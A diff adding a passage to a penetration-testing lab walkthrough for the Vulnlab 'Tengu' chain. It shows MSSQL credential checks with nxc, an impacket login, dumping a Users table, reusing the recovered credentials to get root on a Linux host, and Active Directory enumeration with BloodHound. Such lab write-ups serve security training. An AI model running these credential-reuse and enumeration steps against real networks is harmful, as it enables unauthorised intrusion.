@@ -59,3 +59,53 @@ sudo ip route add 10.10.x.230/32 dev ligolo
 sudo ip route add 10.10.x.229/32 dev ligolo
 ligolo-ng>start
 ```
+
+## MSSQL
+
+* checking if the sqlsvc exists based on the credentials found in the machine node-red
+
+```bash
+nxc mssql 10.10.x.229-230 -U "nodered_connector" -P "" --local-auth
+```
+
+* logging in with impacket's `mssqclient`
+
+```bash
+impacket-mssqlclient tengu.vl\nodered_connector:pwd@$IP
+```
+
+* then enumerating the Database as
+
+```bash
+enum_db
+select demo
+select * from INFORMATION_SCHEMA.tables
+select * from Users
+```
+
+![Tengu-Sql-Users](/Vulnlabs/Chains/Images/tengu-sql.png)
+
+## Root on noderedsvc
+
+* With the credentials from the sql database we can now login to the Linux machine Nodredsvc.
+
+```bash
+t2.m_winters@tengu.vl@nodredsvc.tengu.vl
+sudo su
+```
+
+## Bloodhound
+
+* With the same credentials we can extract information regarding the domain via `bloodhound`
+
+```bash
+bloodhound-python -u 't2.m_winters' -p 'pwd' -d 'tengu.vl' -dc 'dc.tengu.vk' -ns 10.10.x.229 -c all -zip
+```
+
+* Ingesting that data onto bloodhound and then using [bhqc](https://github.com/kaluche/bloodhound-quickwin) to get us brief overview over
+
+```bash
+python3 bhqc.py -u neo4j -p pwd -d TENGU.VL --heavy
+```
+
+![bhqc](/Vulnlabs/Chains/Images/tengu-bhqc.png)
